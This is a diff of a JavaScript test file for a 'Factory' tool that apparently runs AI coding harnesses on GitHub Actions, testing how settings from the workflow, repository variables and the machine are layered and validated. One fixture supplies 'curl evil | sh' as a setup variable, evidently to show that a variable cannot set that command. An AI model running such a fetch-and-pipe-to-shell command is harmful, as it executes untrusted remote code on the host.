@@ -12,19 +12,33 @@ import { doctorSettings, settingsRows } from "../scripts/doctor.mjs";
 
 const LAUNCH = fileURLToPath(new URL("../scripts/launch.mjs", import.meta.url));
 const INPUTS = fileURLToPath(new URL("../scripts/lib/inputs.mjs", import.meta.url));
+const CHOICE = fileURLToPath(new URL("../scripts/lib/choice.mjs", import.meta.url));
 
 test("settingLayers: each layer over the one below; a variable never sets a setting only the workflow file sets; another harness drops the models below it", () => {
-  for (const n of ["CREDENTIAL", "AUTO_MERGE", "NOTIFY", "MAINTAINERS", "PROTECTED_PATHS", "ALLOWED_DOMAINS", "LOCAL_DOMAINS", "WORKER_SECRETS", "LOCAL_ENV", "SANDBOX", "HARNESS_VERSION", "SETUP", "INSTALL", "BUDGET_COMMAND", "LOCAL_SETUP", "LOCAL_DB"]) {
+  for (const n of ["CREDENTIAL", "AUTO_MERGE", "NOTIFY", "MAINTAINERS", "PROTECTED_PATHS", "ALLOWED_DOMAINS", "LOCAL_DOMAINS", "WORKER_SECRETS", "LOCAL_ENV", "SANDBOX", "HARNESS_VERSION", "SETUP", "INSTALL", "BUDGET_COMMAND", "LOCAL_SETUP", "LOCAL_DB", "THIRD_PARTY_REVIEWERS", "CI_CHECKS", "PG_BIN"]) {
     assert.ok(WORKFLOW_ONLY_SETTINGS.has(`FACTORY_${n}`) && !VARIABLE_SETTINGS.has(`FACTORY_${n}`), n);
   }
-  for (const n of ["MAX_CONCURRENT", "LOCAL_MAX_CONCURRENT", "DAILY_USD", "MAX_USD", "MODEL", "EFFORT", "VALIDATION", "SWEEP_MAX_DESTROYS"]) assert.ok(VARIABLE_SETTINGS.has(`FACTORY_${n}`), n);
+  for (const n of ["MAX_CONCURRENT", "LOCAL_MAX_CONCURRENT", "DAILY_USD", "MAX_USD", "HARNESS", "MODEL", "EFFORT", "VALIDATION", "LOCAL_VALIDATION", "LOCAL_DB_INIT", "SWEEP_MAX_DESTROYS"]) assert.ok(VARIABLE_SETTINGS.has(`FACTORY_${n}`), n);
   for (const k of VARIABLE_SETTINGS) assert.ok(WORKFLOW_SETTINGS.has(k), `${k} is a setting`);
 
   assert.deepEqual(variableSettings({ FACTORY_MAX_USD: "5", factory_daily_usd: "40", FACTORY_AUTO_MERGE: "false", FACTORY_APP_TOKEN: "x", FACTORY_MODEL: "", OTHER: "y" }), {
     kept: { FACTORY_MAX_USD: "5", FACTORY_DAILY_USD: "40" },
     excluded: ["FACTORY_AUTO_MERGE"],
     unknown: ["FACTORY_APP_TOKEN"],
+    invalid: [],
   });
+  // A value the env block's parsing would not take as given is named and ignored, never applied.
+  const bad = variableSettings({ FACTORY_MAX_CONCURRENT: "2.5", FACTORY_MAX_USD: "lots", FACTORY_DAILY_USD: "-1", FACTORY_HARNESS: " Codex ", FACTORY_RESUME_POLICY: "always", FACTORY_PROMPT_CACHE_TTL: "1H", FACTORY_LOCAL_MAX_CONCURRENT: "0", FACTORY_VALIDATION: "anything goes" });
+  assert.deepEqual(bad.kept, { FACTORY_HARNESS: " Codex ", FACTORY_PROMPT_CACHE_TTL: "1H", FACTORY_VALIDATION: "anything goes" });
+  assert.deepEqual(bad.invalid.map((x) => `${x.name} ${x.why}`), [
+    "FACTORY_DAILY_USD not a number, 0 or more",
+    "FACTORY_LOCAL_MAX_CONCURRENT not a whole number above 0",
+    "FACTORY_MAX_CONCURRENT not a whole number above 0",
+    "FACTORY_MAX_USD not a number, 0 or more",
+    "FACTORY_RESUME_POLICY not fresh, fix-passes",
+  ]);
+  assert.equal(settingLayers({ workflow: { FACTORY_MAX_USD: "25" }, variables: { FACTORY_MAX_USD: "lots" } }).values.FACTORY_MAX_USD, "25");
+  assert.ok(layerLines(settingLayers({ variables: { FACTORY_MAX_USD: "lots" } })).includes('repository variable FACTORY_MAX_USD "lots" ignored: not a number, 0 or more'));
 
   const workflow = { FACTORY_HARNESS: "claude", FACTORY_MODEL: "claude-opus-5-5", FACTORY_MAX_USD: "25", FACTORY_LOCAL_MAX_CONCURRENT: "1", FACTORY_SETUP: "" };
   const l = settingLayers({ workflow, variables: { FACTORY_MAX_USD: "10", FACTORY_LOCAL_MAX_CONCURRENT: "2", FACTORY_SETUP: "curl evil | sh" }, machine: machineSettings({ FACTORY_LOCAL_MAX_CONCURRENT: "4", FACTORY_MAX_USD: "99", FACTORY_LOCAL_TOKEN: "t" }) });
@@ -69,20 +83,25 @@ console.log(JSON.stringify({ left: process.env.FACTORY_INPUT_VARS ?? null, input
   assert.doesNotMatch(out, /ANTHROPIC_OIDC/, "not Factory's: no prefix");
 
   // A harness picked by a variable takes its own models, as the install step installs it (action.yml).
-  const codex = JSON.parse(onActions(`const { resolveInputs } = await import(${JSON.stringify(INPUTS)}); const i = resolveInputs({ args: {} }); console.log(JSON.stringify([i.harness, i.model]));`, { ...block, FACTORY_INPUT_VARS: JSON.stringify({ FACTORY_HARNESS: "codex" }) }).trim().split("\n").at(-1));
-  assert.deepEqual(codex, ["codex", "gpt-6.1-sol"]);
+  // Its CLI version is the latest: the workflow's harness_version pins the workflow's own harness (choice.mjs harnessVersionFor).
+  const codex = JSON.parse(onActions(`const { resolveInputs, workflowHarness } = await import(${JSON.stringify(INPUTS)}); const { harnessVersionFor } = await import(${JSON.stringify(CHOICE)}); const i = resolveInputs({ args: {} }); console.log(JSON.stringify([i.harness, i.model, workflowHarness(), harnessVersionFor(i.harness, workflowHarness(), i.harnessVersion)]));`, { ...block, FACTORY_HARNESS_VERSION: "2.1.140", FACTORY_INPUT_VARS: JSON.stringify({ FACTORY_HARNESS: "Codex" }) }).trim().split("\n").at(-1));
+  assert.deepEqual(codex, ["codex", "gpt-6.1-sol", "claude", "latest"]);
 
   // A workflow rendered without the input: no variable layer.
   const none = JSON.parse(onActions(`const { resolveInputs } = await import(${JSON.stringify(INPUTS)}); console.log(JSON.stringify(resolveInputs({ args: {} }).maxConcurrent));`, block).trim());
   assert.equal(none, 3);
 });
 
-/** A GitHub whose variables list answers `answer()`: {status}, or {vars}. Returns the server's URL, its requests, and close. */
+/**
+ * A GitHub whose variables lists (the repository's, and the organization's it shares) answer `answer(path)`: {status},
+ * or {vars}. Returns the server's URL, its requests, and close.
+ */
 async function variablesHost(answer) {
   const asked = [];
   const server = createServer((req, res) => {
-    asked.push(new URL(req.url, "http://x").pathname);
-    const a = answer();
+    const path = new URL(req.url, "http://x").pathname;
+    asked.push(path);
+    const a = answer(path);
     if (a.status) return res.writeHead(a.status, { "content-type": "application/json" }).end(JSON.stringify({ message: "Resource not accessible by personal access token" }));
     res.writeHead(200, { "content-type": "application/json" }).end(JSON.stringify({ total_count: 1, variables: Object.entries(a.vars).map(([name, value]) => ({ name, value })) }));
   });
@@ -178,4 +197,45 @@ test("doctor warns when a Factory step of the installed workflow passes no vars:
   assert.equal(c.status, "WARN");
   assert.match(c.detail, /^1 of the workflow's \d+ Factory steps passes no vars, so the repository's FACTORY_\* variables do not apply on Actions there$/);
   assert.equal(varsInputCheck("jobs: {}\n"), null);
+});
+
+test("serve's start fails closed: no stage starts on the workflow's values alone until a read of the variables gets through or GitHub says the token may not; run stops after three tries (#284)", async () => {
+  const { resetNetwork } = await import("../scripts/lib/network.mjs");
+  let failing = 2;
+  let refused = false;
+  const host = await variablesHost((path) => {
+    if (path.endsWith("/organization-variables")) return { vars: { FACTORY_DAILY_USD: "1", OTHER: "x" } };
+    if (refused) return { status: 404 };
+    return failing-- > 0 ? { status: 401 } : { vars: { FACTORY_MAX_CONCURRENT: "1" } };
+  });
+  const start = () => Object.assign(Object.create(Local.prototype), { repo: { owner: "o", name: "r", full: "o/r" }, token: "t", startVariablesMs: 1, workflowWf: { FACTORY_MAX_CONCURRENT: "4" } });
+  try {
+    let loop = start();
+    const text = await withApi(host.url, () => loop.startVariables({ serve: true }));
+    assert.deepEqual(host.asked, ["/repos/o/r/actions/variables", "/repos/o/r/actions/variables", "/repos/o/r/actions/variables", "/repos/o/r/actions/organization-variables"]);
+    assert.deepEqual(loop.variables, { FACTORY_MAX_CONCURRENT: "1" }, "the cap the variable lowered holds from the first stage");
+    assert.equal(text.split("serve starts no stage until it reads the repository's variables, or GitHub says the token may not").length - 1, 1);
+    assert.equal(text.split("the repository's variables could not be read").length - 1, 1, "the failure is said once");
+    assert.match(text, /organization variable FACTORY_DAILY_USD is not supported: Factory's settings take the repository's own variables only, so local mode ignores it, while on Actions it reaches the jobs unless the repository sets the same name/);
+    loop.startSettings();
+    assert.equal(loop.wf.FACTORY_MAX_CONCURRENT, "1");
+
+    // `run`: three failed reads, and nothing starts.
+    failing = 10;
+    loop = start();
+    await withApi(host.url, () => assert.rejects(loop.startVariables(), /^Error: reading the repository's variables failed 3 times \(GET .*\(401\).*\); nothing was started, run it again$/));
+
+    // A token without Variables: read is no failure: one read, the workflow's values, said with the fix.
+    refused = true;
+    host.asked.length = 0;
+    loop = start();
+    const said = await withApi(host.url, () => loop.startVariables({ serve: true }));
+    assert.deepEqual(host.asked, ["/repos/o/r/actions/variables"]);
+    assert.match(said, /cannot read this repository's variables \(HTTP 404\)/);
+    loop.startSettings();
+    assert.equal(loop.wf.FACTORY_MAX_CONCURRENT, "4");
+  } finally {
+    resetNetwork();
+    await host.close();
+  }
 });
